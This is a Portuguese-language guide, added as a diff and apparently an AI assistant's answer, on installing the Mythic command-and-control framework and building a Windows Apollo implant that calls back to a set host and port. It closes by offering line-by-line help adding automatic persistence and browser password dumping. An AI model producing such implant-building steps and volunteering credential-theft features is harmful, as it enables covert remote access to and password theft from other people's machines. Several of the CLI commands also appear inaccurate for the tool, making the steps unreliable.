@@ -1,0 +1,103 @@
+criar um payload baseado no Apollo e deixá-lo 100% funcional e integrado ao Mythic, siga este passo a passo técnico, dividido em 4 grandes fases:
+🧱 1. Pré-requisitos & Ambiente
+a. Instale o Mythic:
+
+Se ainda não tiver:
+
+git clone https://github.com/its-a-feature/Mythic.git
+cd Mythic
+./install.sh
+
+    Isso configura o Mythic, Mythic UI, containers, e CLI.
+
+b. Instale o mythic-cli:
+
+Se ainda não tiver:
+
+pip install mythic-cli
+
+⚙️ 2. Clonar o Apollo & Configurar
+a. Clonar o repositório oficial:
+
+cd Mythic/Payload_Types
+git clone https://github.com/MythicAgents/apollo.git
+
+b. Adicionar no Mythic:
+
+cd Mythic
+./mythic-cli install github https://github.com/MythicAgents/apollo.git
+
+Ou localmente:
+
+./mythic-cli install payload-type apollo --path ./Payload_Types/apollo
+
+Isso:
+
+    Instala o agente
+
+    Constrói o container do payload
+
+    Faz ele aparecer no painel Mythic
+
+🔨 3. Construir e Gerar o Payload
+a. Gerar um payload com mythic-cli:
+
+./mythic-cli payload create \
+  --type apollo \
+  --description "teste-payload" \
+  --filename payload.exe \
+  --params 'callback_host=http://192.168.1.10' \
+           'callback_port=80' \
+           'callback_interval=10' \
+           'callback_jitter=0.1' \
+           'use_ssl=false'
+
+    Veja todos os parâmetros possíveis com:
+
+./mythic-cli payload get-options --type apollo
+
+b. Acompanhar logs e build:
+
+./mythic-cli payload status
+
+Se tudo der certo, o payload ficará disponível para download na UI do Mythic.
+✅ 4. Verificar Integração no Mythic
+
+    Acesse http://localhost:7440 (UI do Mythic)
+
+    Vá até Payloads
+
+    Verifique se o Apollo está listado como tipo de agente
+
+    Verifique se o callback aparece após executar o payload
+
+⚠️ Possíveis Problemas Comuns:
+Erro	Causa	Solução
+registerCallback not found	Versão de agente desatualizada	Atualize o Apollo
+response_insert_input.user_output not found	Campos GraphQL incompatíveis	Verifique schema com /graphql
+Authentication hook unauthorized	Token expirado	Gere novo token no Mythic UI
+💡 Extras:
+📄 Ver o schema GraphQL:
+
+Acesse:
+
+http://<mythic_host>:7440/graphql
+
+Use uma ferramenta como Insomnia ou Postman para inspecionar os tipos e campos.
+📦 Se quiser customizar o Apollo:
+
+    Código fonte: Payload_Types/apollo/agent_code
+
+    Compile com o Visual Studio (.NET Framework 4.0)
+
+    O Mythic usa o código que estiver na pasta agent_code na hora de gerar o payload
+
+Se quiser, posso te ajudar a modificar o código do Apollo para:
+
+    Adicionar comandos personalizados
+
+    Fazer persistência automática
+
+    Dump de senhas de navegador
+
+Só me dizer o que quer fazer que eu guio linha a linha.
